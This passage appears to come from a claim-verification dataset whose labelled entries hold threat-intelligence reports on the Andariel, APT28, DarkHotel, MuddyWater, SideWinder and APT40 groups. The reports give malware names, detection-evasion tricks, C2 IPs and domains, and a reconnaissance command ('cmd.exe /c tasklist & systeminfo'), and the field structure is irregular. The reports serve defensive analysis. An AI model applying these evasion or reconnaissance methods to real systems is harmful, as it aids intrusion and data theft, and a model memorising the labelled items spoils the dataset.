Active-X installed the attack proceeds. After successful exploitation of the vulnerability, a JavaScript or VBScript file is created on the user system and this file downloads the malware from a specified address. Here, the “MZ” ASCII string, which represents a Windows executable file, does not exist within the file. The malware adds this text string starting with MZ from the local system to create an executable file. This method seems to be used to avoid detection by behavior-based security solutions when the executable file is downloaded.Institutions and companies of a certain size often manage multiple systems in their organizations, such as PCs, by connecting them to a central management solution. This central management solution is mainly responsible for Network Access Control (NAC); anti-virus management, software and hardware assets control; and patch management, and it usually provides features such as IT asset management, report generation, software distribution, and remote control. The attacker identifies and analyzes the central management solution used by the target institution or company to find and exploit the vulnerability. The attacks on the central management software can be categorized into two types: management server account attacks and vulnerability attacks on agents installed in the client. Most central management solutions consist of a management server and a client on which the agent is installed. The management server sends batch files to the connected systems or applies policies, and remotely controls the systems. The client processes files and commands sent from the management server. In the event of an attack using the management server, the attacker steals the targeted administrator account and distributes malware in the place of a normal file. This is the reason for the emphasis on management of administrator accounts. Another role of the management server is to receive the security updates for commercial software from external sources (software providers) and distributes them throughout the organization. However, if a file from the external update server tampers (e.g., by hacking); an update file containing malware will be distributed throughout the company or institution via the central management server. The client agent of the central management solution is responsible for receiving and executing the file transmitted from the management server. Generally, the agent has a feature to check whether the delivered command or file is verified. To bypass this process, the attacker pretends to be the management server and sends a command to the agent. The Andariel group is responsible for carrying out many attacks on central management solutions that are widely used in South Korea. The following are the cases of the group transferring malicious files exploiting the vulnerabilities of the client agent in three types of central management solution. The first case is malware that exploits vulnerabilities in central management solution A, which was first discovered in 2015. When the malware is executed, the executable file, v3pscan.exe, containing malware is transmitted to the agent of central management solution A through a specified IP address and executed. Attacks on the central management solution B were made between 2015 and 2017. Various types of malware were used, such as nc.exe, nt.exe, n5lic.exe, nc5rt2.exe, and Bin.exe, to exploit the management system. Also, the attacker used a method of generating a VBScript file, such as vs1.vbs and winrm.vbs, to download malicious files. Variants of this malware were discovered between 2015 and 2017, which used the server IP, target system IP, download address, remote executable path, and other items as arguments to exploit systems and generate script files that downloaded malware. The generated script downloads a file from the address entered as an argument and restores 5 bytes.The malware that exploited the vulnerabilities in central management solution C was first found in September 2016. This attack performs malicious transferring and executing of files.The Andariel group is also known for their attacks on supply chain vulnerabilities. The primary attack method includes incorporating the malware in the software installer edition to infect the target via distribution from the official website and software updates. However, in some cases, the attack was not designed to infect all software users but only the specified target IP address. The group also used the supply chain attack to exploit vulnerabilities of software used in specific industries. The initial targets of the Andariel group were military agencies and the defense industry in South Korea. In 2015, there was an attack on exhibitors in the Seoul International Aerospace & Defense Exhibition (ADEX). ADEX is an international defense industry exhibition that has been hosted bi-annually since 1996. The attacker sent an email with an Excel or Word document containing macros, pretending to be the organizer of the event. The attached document was disguised as a legitimate content, and malware was downloaded when the recipient opened the file and clicked “Use Content” to activate the macro. The downloaded file was a Rifdoor variant. From the document file found later, it seems that the attack group focused on its attacks mainly on the defense industry. [Table 1] below summarizes significant attacks made by the Andariel group.In February 2016, a Korean security company was hacked, and an electronic certificate was leaked. Recently in August 2018, an additional malware was discovered to be distributed as a legitimate DRM program. In April 2016, defense industry, marine service providers, and ICT companies were infected with Gh0st RAT, a malware that exploits vulnerabilities in central management solution B. In June 2016, the Korean police agency unveiled operation Gh0st RAT, a large-scale hacking incident on mega companies in the defense industry that exploited the vulnerabilities in centralized management solutions. Gh0st RAT is a malware that attempts to infect the target through the file distribution function using the vulnerabilities of central management solution A, and about 40,000 documents were leaked by the Gh0st RAT malware. Ever since August 2016, the Andariel group has exploited the vulnerabilities in anti-virus management programs to attack military agencies and leak information. From the end of 2016, the purpose of the attack changed from information leakage to monetary gain. In October 2016, the attacker hacked the website of a software provider and replaced the installation file with a file containing malware to release malicious codes that served as cheats in online gambling games. In 2017, to maximize the chances of a successful attack, malware was distributed to multiple computers using an internet cafe management program. In March 2017, a case was discovered where credit card information was leaked due to the hacking of an ATM in Korea. It seems attempts were made from November 2016, and the malware used in the attack was similar to those used in the leaking of a military agency’s data in 2016. From May to July 2017, there were concentrated attacks on the financial industry. The malware was distributed through the website of monetary unions, and the attacks attempted to exploit the vulnerability of their systems. In October 2017, the largest travel agency in Korea was hacked, resulting in the leakage of personal information. Moreover, travel agency was hacked in December of the same year. In December 2017, the Andariel group modified the ERP solution update file of a company A and added malware to the file. At that time, malware was downloaded only to attack a specific target company, and not all companies using the ERP solution. In December 2017, the Andariel group launched attacks on virtual currency exchange users. In January 2018, it distributed a remote support program containing malware. In February 2018, the group employed various types of attacks, including the email attack where it impersonated the office of a National Assembly member. Malware used in the email attack was a variant of the malware used in the ATM hacking in 2017, and another variant was used in the attacks on the financial industry in June. The Andariel group uses in-house advanced malware, such as Andarat, Andaratm, Phandoor, and Rifdoor, as well as other well-known malware, such as Aryan and Gh0st RAT. Aryan was detected in 2015 and is characterized by the string “F**k Hack Hound.” Gh0st RAT is a backdoor made in China, and its source codes are publicly available. The Andariel group used this malware for attacks from 2015 to 2016. It created and used a Korean version in some cases. Packagers, such as Themida packaged some variants. Rifdoor was first discovered in November 2015, and it remained active until early 2016. A Rifdoor variant was used to attack SEOUL ADEX exhibitors in 2015 and was found in the hacking incidents of security companies in early 2016. Rifdoor is characterized by the string included in the PDB information: E:\\Data\\My Projects\\Troy Source Code\\tcp1st\\rifle\\Release\\rifle.pdb. When it enters the system, Rifdoor generates a file by adding garbage data to the 4 bytes of the last part of the file. Therefore, since the hash value changes each time the system is infected, the malware cannot be found in the system with a simple hash value. shows the major commands associated with Rifdoor and their respective functions. Rifdoor variants have slightly different PDB information as shown in [Table 3].Phandoor was used from January 2016 to the summer of 2017. It is characterized by having the string “S^%” before the main character strings. (E.g. S^%s\\cmd.exe, S^nehomegpa.dll) However, some variants found in 2017 did not contain its characterstring, “Anonymous?” When Phandoor is executed, it initializes and tries to connect to C&C server. At this time, the string “Anonymous?” is sent to check whether that the server is functioning properly. After that, it receives commands from the C&C server such as to execute the cmd.exe file. Andaratm malware was used in attacks on military agencies in 2016, on ATMs and financial institutions in 2017, and on cryptocurrency exchanges in 2018. 18 variants have been identified as of May 2018. The codes of Andaratm include strings such as “%s\\cmd.exe /c echo | %s > %s” and “%s*****%s.” When Andaratm is executed, it acquires information, such as the computer name and username, attempts to connect to the designated C2 server, and receives and executes the command. The encryption method of Andaratm is similar to the methods generally used by malware.Andaratm only executes simple commands, such as downloading files, uploading files, and running cmd.exe files.A tool was also used to check the IP and port with file names like pcon.exe, portc.exe, and zcon.exe. A variant of Zcon.exe was also used in Bmdoor in 2015The Andariel group produced malware named Crash.exe and Test.exe; these malware destroy hard disk contents after August of each year. It is not confirmed, however, whether these malware were used in actual attacks.The Andariel group has launched many attacks using a variety of malware. In addition to the similarity of their codes, factors are indicating the association between these attacks. Results from the detailed analysis of AhnLab shows that the Andariel group and Operation Black Mine take the similar attack methods, and in particular, they both used the file, zcon.exe. This suggests that Operation Black Mine is associated with the Andariel group. The similar malware was used to attack various targets, and some of them used the same C2.For macro-based attacks, there was no significant difference between the macro codes of 2015 and 2017. The Andariel Group is one of the most active threat groups in South Korea. In the early days, most attacks were designed to steal military information. Since the end of 2016, however, attacks have also been made for monetary gain. In addition, based on their frequent attacks using vulnerabilities of software used by the target, it can be seen that the group is well aware of Korea IT environment. As evident in the attack cases of the group, central management solutions of companies and institutions can become a route of an attack at any time. Attacks exploiting a central management solution may cause enormous damage throughout the organization. Thus, more strengthened security management is required. In particular, a security policy for the management server of a central management solution is critical. Suitable management is required to ensure that necessary security policies are observed, such as frequently changing administrator’s login password of the management server and not saving it in the system, as well as limiting the access to the management server. In addition, logs must be checked periodically to make sure that abnormal files have not been distributed via the management server. There was a case where the attacker exploited the vulnerability in an agent installed in the client without going through the management server, so it is necessary to monitor whether or not scanning of the port number used by the central management solution occurs. Attackers use a variety of methods in their attempts to infiltrate companies and institutions. Most organizations focus on strengthening security on endpoints, but it is just as much essential to monitor events that occur in the internal infrastructure, just like the central management solution.\n\n\n",

        "explain": "Recently, a new series of malware samples were submitted to the major online sandboxes. We noticed one sample submitted to Virus Total that was attributed by some experts to the Russian APT28 group. The APT28 group (aka Fancy Bear, Pawn Storm, Sednit, Sofacy, and Strontium) has been active since at least 2007 and it has targeted governments, militaries, and security organizations worldwide. The group was involved also in the string of attacks that targeted 2016 Presidential election. With the help of the researcher that goes online with the Twitter handle Drunk Binary (@DrunkBinary) we obtained a collection of samples to compare with the one we were in possession to discover if we were in presence of a new variant of the infamous APT28 backdoor tracked as X-Agent. The attack we analyzed is multi-stage, an initial dropper malware written in Delphi programming language (a language used by the APT28 in other campaigns) downloads a second stage payload from internet and executes it. The payload communicates to the server using HTTPS protocol, making it impossible to eavesdrop on the malicious traffic it generates. We also analyzed another malicious DLL, apparently unrelated to the previous samples, that presents many similarities with other payloads attributed to the Russian APT group. This malware is particularly interesting for us because it contacts a command and control with the name “marina-info.net” a clear reference to the Italian Military corp, Marina Militare. This lead us into speculating that the malicious code was developed as part of targeted attacks against the Italian Marina Militare, or some other entities associated with it. This last DLL seems to be completely unconnected with the previous samples, but further investigation leads us into believing that it was an additional component used by APT28 in this campaign to compromise the target system. APT28 has a rich arsenal composed of a large number of modular threats and the dll is the component of the X-Agent we analyzed. X-Agent is a persistent payload injected into the victim machine that can be compiled for almost any Operating System and can be enhanced by adding new ad-hoc component developed for the specific cyber-attack. In our case, the component was submitted to online sandboxes while the new campaign was ongoing. We cannot exclude that the APT group developed the backdoor to target specific organizations including the Italian Marina Militare or any other subcontractor. In our analysis we were not able to directly connect the malicious dll file to the X-Agent samples, but believe they are both part of a well-coordinated surgical attack powered by APT28. The dll that connect to “marina-info.net” may be the last stage-malware that is triggered only when particular conditions occur, for example when the malware infects a system with an IP address belonging to specific ranges.In this section we reports all the sample we analyzed in our investigation. The first four executables listed in the previous paragraph were used as infection vectors in the new campaign we investigated. The samples appear as different payloads but further basic static analysis allowed us to discover that they are the same malware sample:These files seem to be a classic img and a link, but actually the jpg file is the executable of the second sample and in the link file is hidden the following command:After executing the file, it contacts the IP “45.124.132.127” where it sends periodically some information gathered on the operative system, using the command line “cmd.exe /c tasklist & systeminfo”. The information is sent to the command and control through HTTPS communication using a POST method.Once the malware has sent the information about the host configuration to the C2, it will download another file, “upnphost.exe”, stored in the path “%APPDATA%\\Local\\Temp” that probably is the final payload. Moreover, the executable implements a persistence mechanism by setting the registry key: This other file contacts another command and control “46.183.218.37”, located in Latvia:We also discovered that the “upnphost.exe” file was submitted to Virus Total by us, likely because the evasion technique implemented by the dropper. In order to analyze the dropper, we patched it. Once the patching was applied we was able to analyze the complete malicious behavior of the malware. The malicious code starts contacting the previously mentioned Command and Control and downloads this “upnphost.exe” file. Below the results we obtained submitting the patched version of the binary on VirusTotal: The communication with the command and control is managed with a script written in the AutoIt language. This script is embedded in the “upnphost.exe” file as resource, and, when it is launched, it communicates with this other server in HTTPS, sending some information about the victim’s computer.The above figure shows a piece of decompiled code of the AutoIt script, where the IP address and the path, with relative user agent are masqueraded in hexadecimal encoding. After decoding the parameters, we obtain the IP address, the path and the user agent used to contact the C&C and send back the information about the target system.Another peculiarity, is the name of the function where is present the code for the HTTPS communication. It is “checkupdate()” and it seems that the malware is instructed to contact periodically the C&C waiting for new commands. The following picture shows the multi-stage attack:This file was retrieved from the threat intelligence platforms and was flagged as an APT28 sample, such as also the previous files. It is not clear if this sample is connected to the previous ones, but probably it belongs to the same infection campaign because it was uploaded in the same time period on several online sandboxes. Another characteristic in common to the previous files is that, this one is written in Delphi programming language, like also the four initial file droppers. It is rare to find a malware written in Delphi language, but previous investigations conducted by other security firms confirm that the APT28 group already used malware written in this language in past campaigns. The most important evidence emerged from the analysis of the sdbn.dll is that it contacted the domain: “marina-info.net,” a clear reference to the Italian Marina Militare. The domain is resolved in the IP “191.101.31.250” which is located in Holland:The communication to the C2 is performed also in this case by using the HTTPS protocol. We discovered at least three paths contacted with a custom user agent header:Like the “upnphost.exe” malware, this other executable periodically contacts the command and control waiting for new commands. However, we discovered that the server responds always with 403 Status code Forbidden, also to the requests sent by the malware itself. This behavior could be the result of a server-side control implemented by the server to allow the requests coming only from particular IP addresses or simply it was intentionally disabled by the attackers likely because they believe to have been uncovered by the victims or by the security firms. It could be a security mechanism implemented by the attackers to make hard the investigation of security firms. Moreover, we decided to further investigate the detection rate of this new file on VirusTotal. When we started our analysis it was zero, this means that the threat was completely undetected and currently the malicious code has a detection rate of 35/65.In this paragraph, we show the threat map with the location of the various IP addressed contacted by the samples we analyzed. As we can see, the attack surface covered by the hacker group is incredibly wide: there are two different C2Cs in Europe and another one in China to mislead the analysis and this create confusion during the reconstruction of the complete cyber-attack.\n\n\n",

        "claim": "DarkHotel is a cyberattack group that engages in highly targeted malicious attacks.",
        "original_label": "true",
        "label": "true",
        "explain": "DarkHotel is a cyberattack group that engages in highly targeted malicious attacks. They seek to compromise and steal data from valuable targets like C-level business executives and other high-level figures. Classed by Kaspersky as an advanced persistent threat (APT), DarkHotel APT remains a major risk for governments, enterprises, and other institutions. The name DarkHotel is derived from their unique method of tracking traveler’s plans and attacking them via hotel Wi-Fi. They have also been labeled as ‘Tapaoux’ due to the name of the Trojan they used in many attacks. Since their initial rising, they have scaled beyond business targets to attack politicians and more. With their long, mostly consistent history, they present a threat to national economies and politics across the globe. DarkHotel has been known to compromise luxury hotel networks, then stage attacks from those networks on selected high-profile victims. At the same time, their botnet-style operations are used for massive surveillance or to perform other tasks. Other methods include DDoS (distributed Denial-of-Service) attacks or installing more sophisticated espionage tools on the computers of particularly interesting victims. The DarkHotel group appears to use a combination of spear phishing, dangerous malware, and botnet automation designed to capture confidential data. As analyzed by Kaspersky’s Global Research and Analysis Team, DarkHotel utilizes layered attacks. Generally, each type of campaign they’ve used involved two malware infection stages: Initial bait for malware infection — to infiltrate devices and vet for high-value targets. Secondary follow-up malware infection — to steal data from selected high-value targets. The first infection is usually a Trojan delivering access for the DarkHotel attackers. The malware payload then lies quietly in waiting for months before becoming active. Once active, the malware contacts a command-and-control (C&C) server for further instruction. The second infection is delivered exclusively to high-value targets. These individuals are identified and loaded with a kernel-level keylogger or other spyware. DarkHotel can then collect any private data entered or stored in the device that they want. Zero-day exploits are discovered and exploited by DarkHotel APT in their planning stages. Undiscovered security gaps in user programs allow the group to manipulate them and breach devices. They notably target Internet Explorer and Adobe products. Reverse engineering allows the digital signing of malware, essentially forging certificates for the illusion of legitimacy. This helps DarkHotel make software updates appear to be officially from companies like Adobe and Google. Command-and-control servers automate the process of delivering malware infections. The structure is similar to the leadership of a botnet and can even be used to build one. Who Is Targeted by DarkHotel Attacks? Cybercriminals behind DarkHotel have been operating for over a decade, targeting thousands of victims across the globe. 90% of the DarkHotel infections we have seen are in Japan, Taiwan, China, Russia, and Korea, but we have also seen infections in Germany, the USA, Indonesia, India, and Ireland. DarkHotel APT seems to have a particular interest in political officials, as well as global C-level executives leading economic growth and investing. Nuclear-equipped nations have notably appeared as their targets as well. Targeted attacks in enterprise sectors are focused on CEOs, Senior Vice Presidents, Sales and Marketing Directors, and top R&D staff. Attacks typically start by tricking individual employees into doing something that jeopardizes corporate security. Staff with public-facing roles (e.g. senior executives, sales, and marketing personnel) can be particularly vulnerable, especially since they are often on the road and are likely to use untrusted networks (e.g. at hotels) to connect to a corporate network. They may also be using personal devices that are less secure or without antivirus protection. DarkHotel attack campaigns are unusual due to employing layers of malicious targeting. They began with hotel Wi-Fi attacks via the Tapaoux Trojan malware and botnet-like command infrastructure to further infiltrate targets. Around 2014, an investigation from Kaspersky prompted DarkHotel to initiate an emergency shutdown on most of their command-and-control servers. Despite a short period of quiet activity, the group has moved towards politically targeted spear phishing and mass P2P file-sharing infections as of 2016 via their Inexsmar malware. Hotel Wi-Fi exploits are used against targets as a more direct means of spear phishing. By tracing unsuspecting executives who are traveling overseas, they can preemptively infect the Wi-Fi network of their hotel. This is done by planting the infection on the hotel’s server. The infection spreads a rare Trojan that masquerades as one of several major software releases, including Google Toolbar, Adobe Flash, and Windows Messenger. This first stage infection is used by the attackers to qualify their victims. Once the intended targets have been identified, Dark Hotel attackers download further malware to their computers to steal confidential data. Spear phishing emails are another half of the directly targeted campaign to infiltrate high-profile individuals. The attacks follow the typical spear phishing process with thoroughly disguised DarkHotel implants. Email-lure content often includes topics like nuclear energy and weaponry capabilities. Over the past several years, spear phishing emails have contained an Adobe zero-day exploit attached. They’ve also used links that redirect targets’ browsers to Internet Explorer zero-day exploits. While DarkHotel’s email and hotel attacks engage in pinpoint targeting, they also spread malware indiscriminately via Japanese P2P (peer-to-peer) file-sharing sites. The malware is distributed as a part of a large RAR archive. It purports to offer sexual content but installs a backdoor Trojan that gathers confidential data from the victim. While all of these campaigns may not be currently active, these tactics have proven effective for DarkHotel. They may at any point try to use past methods for data breaching. Furthermore, they might be using or developing other methods aimed to hack high-level organizations. As demonstrated throughout cyberattack history, the skill and effort put into an attack is usually no less than the scale of the payoff. DarkHotel uses refined tactics that seem to aim towards high-payoff data rather than less valuable targets. Unlike many other malware-based attacks, the malicious programming in this ongoing campaign appears to be designed by a highly skilled coder. Based on a string within the malicious code, it appears that the threat points to a Korean threat actor as the source of origination. DarkHotel’s attack developers use surgically precise attack methods to execute and clean up after their attacks. Their demonstrated high level of coding skill and planning makes their attacks extremely difficult to trace, much less spot them amid an attack. Their coordination in hotel attacks specifically suggests that they may have insider assistance at hotels. Furthermore, the scale of targeting suggests nation-state actors or nation-state support for these attacks. With their history of targeting political, nuclear, and economic forces, DarkHotel poses a threat to national security across many countries. The spear phishing and botnet methods are still an ongoing threat for users. Although total prevention can be challenging, here are some tips on how to stay safe from DarkHotel when traveling: Always use trusted VPN tunnels if you plan on accessing public or even semi-public Wi-Fi. A virtual private network can give you an encrypted barrier to keep out any infected servers from feeding malware bait into your connection. Learn and understand the red flags of spear phishing attacks. Odd spelling in the sender’s email address and a prompt to open a link or attachment can be caution signs. Attackers tend to use urgency and heighten your emotions to get you to take immediate action and compromise yourself. An increase in panic, fear, or curiosity can also indicate risks. Verify the authenticity of the email via official phone numbers or in-person contact when possible. Do not use any contact information found within the email as it could also be fraudulent. Maintain and update all system software. Security patches for existing, known software vulnerabilities are packaged in software updates. You should download updates promptly, provided you’ve verified through official vendor channels that they are not falsified. Always verify executable files and treat files shared over P2P networks with caution and suspicion. Again, these files can easily be bait for malware infections. Even legitimate files can be modified for a hacker’s benefit. When traveling, try to limit software updates. If you can avoid accepting any software updates while away from secure workplace networks, you can minimize your risks of these known hotel Wi-Fi exploits. Install quality Internet security software. Make sure it includes proactive defense against new threats rather than just basic antivirus scanning and malware removal. Web protection like link threat-scanning and phishing filters can help you combat threats like those used by DarkHotel.\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "The MuddyWater campaign was first sighted in 2017 when it targeted the Saudi government using an attack involving PowerShell scripts deployed via Microsoft Office Word macro. In March 2018, we provided a detailed analysis of another campaign that bore the hallmarks of MuddyWater. In May 2018, we found a new sample (Detected as W2KM_DLOADR.UHAOEEN) that may be related to this campaign. Like the previous campaigns, these samples again involve a Microsoft Word document embedded with a malicious macro that is capable of executing PowerShell (PS) scripts leading to a backdoor payload. One notable difference in the analyzed samples is that they do not directly download the Visual Basic Script(VBS) and PowerShell component files, and instead encode all the scripts on the document itself. The scripts will then be decoded and dropped to execute the payload without needing to download the component files. As mentioned earlier, our analysis of the sample revealed characteristics that likely connect it to the MuddyWater campaign, in particular: The sample we analyzed was a Word document used as a lure for unsuspecting victims. However, unlike the samples from the previous campaigns, the lure document deals with a different subject matter. Instead of using government or telecommunications-related documents, the new lure document presents itself as a reward or promotion, which could indicate that the targets are no longer limited to specific industries or organizations. The document is designed to trick users into enabling the macro to view its full content. However, the macro’s true purpose is to allow it to execute malicious routines without the user’s knowledge. Once the macro is enabled, it will use the Document_Open() event to automatically execute the malicious routine if either a new document using the same template is opened or when the template itself is opened as a document0. The malicious macro’s code snippet uses three main functions, specifically: Analysis of the code revealed a PowerShell script capable of decoding the contents of the malicious document, which results in the execution of yet another encoded PowerShell script.This will then result in more readable PowerShell scripts capable of dropping various components in the %Application Data%\\Microsoft\\CLR\\* directory. The main PowerShell file invoker.ps1 uses these components to run the final payload, PRB-Backdoor, previously analyzed by other security researchers in May 2018.PRB-Backdoor is a backdoor that takes its name from the function used in the final PowerShell script payload, as seen in the figure below.The backdoor communicates with its Command-and-Control (C&C server), hxxp://outl00k[.]net, to send and receive the following commands:Given the use of lure documents designed with social engineering in mind, it is likely that the attackers use phishing or spam to target users who are unaware of these documents’ malicious nature. Awareness can effectively mitigate or stop these kinds of attacks from being successful. The first step is to be able to identify phishing attacks and distinguish legitimate emails from malicious ones. Telltale signs of social engineering include “too-good-to-be-true” offers and messages that lack context. In general, users should always practice caution when it comes to email. This includes avoiding clicking on links or downloading any documents unless certain that these are legitimate.

        "original_label": "true",
        "label": "true",
        "explain": "While tracking the activities of the SideWinder group, which has become infamous for targeting the South Asia region and its surrounding countries, we identified a server used to deliver a malicious LNK file and host multiple credential phishing pages. We learned that these pages were copied from their victims’ webmail login pages and subsequently modified for phishing. We believe further activities are propagated via spear-phishing attacks. The group’s targets include multiple government and military units, mainly in Nepal and Afghanistan. After the gathered credentials are sent, some of the phishing pages will redirect victims to diàerent documents or news pages. The themes and topics of these pages and documents are related to either Covid19 or recent territory disputes between Nepal, Pakistan, India, and China. Furthermore, it seems that these lures are distributed via phishing links.We also found multiple Android APK files on their phishing server. While some of them are benign, we also discovered malicious files created with Metasploit. One of the normal applications, called “OpinionPoll,” is a survey app for gathering opinions regarding the Nepal-India political map dispute, which seems to be another political lure similar to the one they used in the spearphishing portion. We believe these applications are still under development and will likely be used to compromise mobile devices in the future. SideWinder has been very active in 2020. Earlier this year, we published a report on how the SideWinder APT group used the Binder exploit to attack mobile devices. The group also launched attacks against Pakistan, Bangladesh, and China using lure files related to Covid-19.The use of malicious documents is one of SideWinder’s most common infection vectors. We collected several diàerent samples from the campaign, including:All of these cases end up with either the downloading or dropping of files and then the execution of JavaScript code, which is a dropper used to install the main backdoor + stealer. The downloaded RTF files exploit the CVE-2017-11882 vulnerability. It drops a file named 1.a (a JavaScript code), which drops the backdoor + stealer into a folder in ProgramData and directly executes it or creates a scheduled task to execute the dropped files at a later time.The content of the newly created folder contains a few files, including Rekeywiz (EFS REKEY wizard, FA86B5BC5343CA92C235304B8DCBCF4188C6BE7D4621C625564BEBD5326E D850), which is a legitimate Windows application.This application loads various system DLL libraries, including shell32.dll, which sideloads DUser.dll, one of shell32’s DelayImports.However, a fake DUser.dll gets loaded into the process. This fake DLL library decrypts the main backdoor + stealer from the .tmp file in the same directory.The decryption process is a simple XOR, where the key is the first 32 bytes from the encrypted file and the payload are the remaining bytes. The decrypted payload is the main backdoor .NET executable binary.In Resources, the Default resource contains the encrypted configuration. After decryption (using the same principle as with the main backdoor + stealer), the configuration reveals which file formats the attackers are targeting.The collected information is in JSON format (hence why the Newtonsoft_Json library stored in Resources is loaded) and includes information such as privileges, user accounts, computer system information, antivirus programs, running processes, processor information, operating system information, timezone, installed Windows updates, network information, list of directories in Users\\%USERNAME%\\Desktop, Users\\%USERNAME%\\Downloads, Users\\%USERNAME%\\Documents, Users\\%USERNAME%\\Contacts, as well as information on all drives and installed apps.We found several interesting dynamic DNS domains resolving to a server that was used to deliver SideWinder’s malicious documents. The subdomains of these dynamic DNS domains are designed to be similar to the domains of their victims’ mail servers. For example, “mail-nepalgovnp[.]duckdns[.]org” was created to pretend to be the original Nepal government’s domain “mail[.]nepal[.]gov[.]np”. Digging deeper, we found that it hosted several phishing pages. These pages were copied from the webmail servers of various targets and then modified for spear-phishing attacks designed to steal login credentials. Although it’s not clear to us how these phishing pages are delivered to the victims, finding the original webmail servers that they copied to make these phishing pages allows us to identify who they were targeting. Analysis of the phishing pages revealed that most of them would redirect to the original webmail servers, which they copied after the victims sent out their login credentials. However, we also found some of them will either redirect to documents or news pages. These documents and news are probably interesting in some way to their targets and are used to make them click and log in to the phishing pages. While several of the documents are related to https://www.trendmicro.com/en_us/research/20/l/sidewinder-leverages-south-asian-territorial-issues-for-spear-ph.html 7/39 Covid-19, we also found some documents or news related to territorial issues in South Asia, including:We also identified multiple Android APK files on their server. Interestingly, these Android applications still seem to be under the initial development phase as they are basic, still use the default Android icons, and have no practical function for users.We noticed two applications among them, named “My First APP” and “Opinion Poll,” that seemingly have no malicious behavior. My First APP demonstrates login & register processes, while Opinion Poll acts as an opinion polling application for the Indian-Nepalese political map dispute. The first application is likely an Android demo application for beginners, while the second one starts with an explanation of “Opinion Writing,” followed by a survey.Another two applications were built from JavaPayload for Metasploit that will load extra code from the remote server configured in the sample. While we were unable to retrieve the payload, according to the Manifest that requests numerous privacy-related permissions like location, contacts, call logs, etc., we can infer that it goes after the user’s private data. These two samples appear to be debug versions as they have no activities or any other component except Metasploit.We also identified a malicious version of the My First APP application that added Metasploit whose class names have been obfuscated.https://www.trendmicro.com/en_us/research/20/l/sidewinder-leverages-south-asian-territorial-issues-for-spear-ph.html 19/39 SideWinder has used malicious apps as part of its operation before. In the campaign referenced earlier, the group used malicious APKs disguised as photography and file manager tools to lure users into downloading them. Once downloaded into the user’s mobile device, the malicious APKs launch a series of fairly sophisticated procedures that includes rooting the device to stealthily deploy the payload, as well as exploiting CVE-2019-2215 and MediaTek-SU vulnerabilities for root privileges. The payload’s ultimate goal is to gather information from the compromised device and then send it back to its C&C server. In the case of these newer APKs, it seems that the goal is to gather user information as well. Unlike the earlier apps, which were already on the Google Play Store, all the APK files found on their server are not mature enough for a deliberate attack. In our opinion, these are still in the initial stage, and the payloads (directed at mobile users) are still being refined further.As seen with their phishing attacks and their mobile device tools’ continuous development, SideWinder is very proactive in using trending topics like Covid19 or various political issues as a social engineering technique to compromise their targets. Therefore, we recommend that users and organizations be vigilant and follow social engineering best practices to protect themselves from these kinds of campaigns.\n\n\n",

        "explain": "FireEye is highlighting a cyber espionage operation targeting crucial technologies and traditional intelligence targets from a China-nexus state sponsored actor we call APT40. The actor has conducted operations since at least 2013 in support of China’s naval modernization effort. The group has specifically targeted engineering, transportation, and the defense industry, especially where these sectors overlap with maritime technologies. More recently, we have also observed specific targeting of countries strategically important to the Belt and Road Initiative including Cambodia, Belgium, Germany, Hong Kong, Philippines, Malaysia, Norway, Saudi Arabia, Switzerland, the United States, and the United Kingdom. This China-nexus cyber espionage group was previously reported as TEMP.Periscope and TEMP.Jumper.In December 2016, China’s People Liberation Army Navy (PLAN) seized a U.S. Navy unmanned underwater vehicle (UUV) operating in the South China Sea. The incident paralleled China’s actions in cyberspace; within a year APT40 was observed masquerading as a UUV manufacturer, and targeting universities engaged in naval research. That incident was one of many carried out to acquire advanced technology to support the development of Chinese naval capabilities. We believe APT40’s emphasis on maritime issues and naval technology ultimately support China’s ambition to establish a blue-water navy. In addition to its maritime focus, APT40 engages in broader regional targeting against traditional intelligence targets, especially organizations with operations in Southeast Asia or involved in South China Sea disputes. Most recently, this has included victims with connections to elections in Southeast Asia, which is likely driven by events affecting China’s Belt and Road Initiative. China’s “One Belt, One Road” (一带一路) or “Belt and Road Initiative” (BRI) is a $1 trillion USD endeavor to build land and maritime trade routes across Asia, Europe, the Middle East, and Africa to develop a trade network that will project China’s influence across the greater region.Figure 1: Countries and industries targeted. Countries include the United States, United Kingdom, Norway, Germany, Saudi Arabia, Cambodia and Indonesia We assess with moderate confidence that APT40 is a state-sponsored Chinese cyber espionage operation. The actor’s targeting is consistent with Chinese state interests and there are multiple technical artifacts indicating the actor is based in China. Analysis of the operational times of the group’s activities indicates that it is probably centered around China Standard Time (UTC +8). In addition, multiple APT40 command and control (C2) domains were initially registered by China based domain resellers and had Whois records with Chinese location information, suggesting a China based infrastructure procurement process. APT40 has also used multiple Internet Protocol (IP) addresses located in China to conduct its operations. In one instance, a log file recovered from an open indexed server revealed that an IP address (112.66.188.28) located in Hainan, China had been used to administer the command and control node that was communicating with malware on victim machines. All of the logins to this C2 were from computers configured with Chinese language settings. APT40 has been observed leveraging a variety of techniques for initial compromise, including web server exploitation, phishing campaigns delivering publicly available and custom backdoors, and strategic web compromises. APT40 uses a variety of malware and tools to establish a foothold, many of which are either publicly available or used by other threat groups. In some cases, the group has used executables with code signing certificates to avoid detection.APT40 uses a mix of custom and publicly available credential harvesting tools to escalate privileges and dump password hashes.APT40 uses compromised credentials to log on to other connected systems and conduct reconnaissance. The group also leverages RDP, SSH, legitimate software within the victim environment, an array of native Windows capabilities, publicly available tools, as well as custom scripts to facilitate internal reconnaissance.APT40 uses many methods for lateral movement throughout an environment, including custom scripts, web shells, a variety of tunnelers, as well as Remote Desktop Protocol (RDP). For each new system compromised, the group usually executes malware, performs additional reconnaissance, and steals data. APT40 primarily uses backdoors, including web shells, to maintain presence within a victim environment. These tools enable continued control of key systems in the targeted network.Completing missions typically involves gathering and transferring information out of the target network, which may involve moving files through multiple systems before reaching the destination. APT40 has been observed consolidating files acquired from victim networks and using the archival tool rar.exe to compress and encrypt the data before exfiltration. We have also observed APT40 develop tools such as PAPERPUSH to aid in the effectiveness of their data targeting and theft.Despite increased public attention, APT40 continues to conduct cyber espionage operations following a regular tempo, and we anticipate their operations will continue through at least the near and medium term. Based on APT40’s broadening into election-related targets in 2017, we assess with moderate confidence that the group’s future targeting will affect additional sectors beyond maritime, driven by events such as China’s Belt and Road Initiative. In particular, as individual Belt and Road projects unfold, we are likely to see continued activity by APT40 which extends against the project’s regional opponents.\n\n\n",

        "original_label": "true",
        "label": "true",
